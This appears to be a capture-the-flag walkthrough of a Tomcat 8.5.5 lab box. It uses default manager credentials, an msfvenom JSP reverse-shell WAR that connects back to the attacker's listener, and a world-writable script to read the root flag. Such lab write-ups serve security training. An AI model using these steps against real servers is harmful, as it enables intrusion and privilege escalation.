Based nmap scan after deploying
```
sudo nmap -A -v 10.10.67.115

 PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST

```
2-nd phrase of scanning:

```
$ gobuster dir -u http://10.10.67.115:8080 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.115:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```
 after going and cenceling login form of page http://10.10.67.115/manager/ 

Page throws 401 Error and login and password: tomcat:s3cret

After getting admin pass and login i logged in to http://10.10.67.115/manager/ and deployed reverse shell:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.23.140.77 LPORT=4546 -f war >exp.war

```

then used netcat to wait for payload
`nc -lvnp 4546`



after creating payload i deployed it and activeted it

`http://10.10.67.115:8080/exp`


```
listening on [any] 4546 ...
connect to [10.23.140.77] from (UNKNOWN) [10.10.67.115] 35296

ls /home
jack
cd /home/jack
ls -al
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Jul 10 07:51 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
cat user.txt
39400c90bc683a41a8935e4719f181bf```

 
now lets use Privilege Escalation to get root flag


```
echo "
#!/bin/bash
cat /root/root.txt >out.txt"> id.sh

$./id.sh 
$cat out.txt
d89d5391984c0450a95497153ae7ca3a
```

